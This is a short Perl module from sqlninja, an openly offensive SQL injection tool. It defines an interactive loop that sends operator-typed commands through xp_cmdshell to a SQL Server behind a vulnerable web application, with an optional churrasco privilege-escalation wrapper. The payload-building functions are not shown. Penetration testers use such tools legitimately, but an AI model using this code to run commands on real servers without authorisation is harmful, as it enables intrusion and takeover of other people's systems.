# This file is part of sqlninja
# Copyright (C) 2006-2013
# http://sqlninja.sourceforge.net
# icesurfer <r00t@northernfortress.net>
# nico <nico@leidecker.info>
# 
# Sqlninja is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Sqlninja is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with sqlninja. If not, see <http://www.gnu.org/licenses/>.

use strict;

our $conf;

# Launches "blind" commands using xp_cmdshell through the web application
sub sqlcmd
{
	print "[+] Starting blind command mode.";
	print " Use \"exit\" to be dropped back to your shell.\n";
	my $cmd;
	my $command;
	my $result;
	while (1) {
		print "> ";
		$cmd = <STDIN>;
		chomp($cmd);
		if ($conf->{'churrasco'} == 1) {
			$cmd = usechurrasco($cmd);
		}
		if ($cmd eq "exit") {
			print "Thank you for using sqlninja... see ya\n";
			exit(0);
		}
		if ($cmd ne "") {
			$command = createcommand($cmd);
        		$result = sendrequest($command);
			print "[+] Command has been sent and executed\n";
		}
	}
}

1;